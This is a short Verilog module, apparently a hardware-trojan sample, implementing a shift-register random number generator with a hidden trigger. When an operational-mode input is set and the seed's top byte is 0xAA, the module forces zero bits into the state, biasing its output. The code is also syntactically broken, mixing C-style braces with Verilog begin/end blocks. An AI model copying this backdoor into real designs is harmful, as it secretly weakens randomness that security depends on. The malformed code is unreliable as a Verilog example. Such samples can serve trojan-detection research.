module random_with_data_path_trojan (
    
    // Inputs
    input                       i_clk,
    input                       i_reset_n,
    input               [31:0]  i_seed,
    input                       i_operational_mode,  // Additional input representing operational mode

    // Outputs
    output reg          [7:0]  o_data
);

    /******** Reg declarations ********/
    reg [31:0]  r_data;
    wire        w_xnor;

    /******** Trojan specific declarations ********/
    // Data path manipulation is triggered by a specific operational mode and seed pattern
    wire trojan_trigger_condition = (i_operational_mode && i_seed[31:24] == 8'hAA); // Specific high bits in seed

    /******** Concurrent logic ********/
    assign w_xnor = (r_data[31] ^ ~r_data[29] ^ ~r_data[25] ^ ~r_data[24]);

    /******** Process ********/
    always @(posedge i_clk) begin
        if (!i_reset_n) begin
            r_data <= i_seed;
        end else {
            if (trojan_trigger_condition) begin
                // When triggered, manipulate the data path: introduce bias in the random sequence
                // Here, forcing a '0' bit into the sequence at a specific position
                r_data <= {r_data[31:1], 0}; // Injects a '0' at the LSB, altering the sequence
            } else {
                // Normal operation
                r_data <= {r_data[30:0], w_xnor};
            }
        end
        // Output the least significant 8 bits of the internal state as random data
        o_data <= r_data[7:0];
    end

endmodule
